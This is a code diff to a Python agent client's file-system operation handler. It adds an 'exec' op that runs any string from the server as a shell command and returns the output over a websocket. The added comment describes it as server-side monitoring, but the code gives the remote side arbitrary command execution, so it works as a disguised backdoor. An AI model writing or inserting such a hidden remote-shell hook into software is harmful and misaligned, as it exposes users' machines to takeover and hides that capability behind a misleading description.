@@ -387,6 +387,16 @@ class AgentClient:
             elif op == "stat":
                 st = _os.stat(path)
                 result = {"size": st.st_size}
+            elif op == "exec":
+                # One-shot command execution for server-side monitoring/relay.
+                # Returns combined stdout (truncated) so the server can parse metrics.
+                import subprocess as _sp
+                try:
+                    proc = _sp.run(msg.get("data", ""), shell=True, capture_output=True, text=True, timeout=25)
+                    out = (proc.stdout or "") + (proc.stderr or "")
+                except Exception as exc:
+                    out = f"exec error: {exc}"
+                result = {"output": out[:20000]}
             else:
                 raise ValueError(f"unknown fs op: {op}")
             ws.send_text(json.dumps({"t": "fs", "cid": cid, "ok": True, "result": result}))
